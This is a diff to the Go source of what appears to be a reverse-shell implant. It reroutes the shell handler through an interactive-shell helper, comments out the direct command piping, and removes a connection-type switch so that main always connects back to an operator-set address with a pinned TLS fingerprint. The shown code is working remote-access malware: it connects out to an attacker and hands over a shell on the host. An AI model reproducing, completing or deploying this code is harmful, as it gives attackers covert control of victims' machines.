@@ -7,7 +7,6 @@ import (
 	"encoding/hex"
 	"net"
 	"os"
-	"os/exec"
 	"strings"
 
 	"./shell"
@@ -22,15 +21,15 @@ const (
 var (
 	connectString string
 	fingerPrint   string
-	connType      string
 )
 
 func RunShell(conn net.Conn) {
-	var cmd *exec.Cmd = shell.GetShell()
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-	cmd.Stdin = conn
-	cmd.Run()
+	shell.InteractiveShell(conn)
+	//var cmd *exec.Cmd = shell.GetShell()
+	//cmd.Stdout = conn
+	//cmd.Stderr = conn
+	//cmd.Stdin = conn
+	//cmd.Run()
 }
 
 func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
@@ -64,17 +63,12 @@ func Reverse(connectString string, fingerprint []byte) {
 }
 
 func main() {
-	if connectString != "" && fingerPrint != "" && connType != "" {
+	if connectString != "" && fingerPrint != "" {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
 			os.Exit(ERR_COULD_NOT_DECODE)
 		}
-		switch connType {
-		case "reverse":
-			Reverse(connectString, bytesFingerprint)
-		default:
-			Reverse(connectString, bytesFingerprint)
-		}
+		Reverse(connectString, bytesFingerprint)
 	}
 }
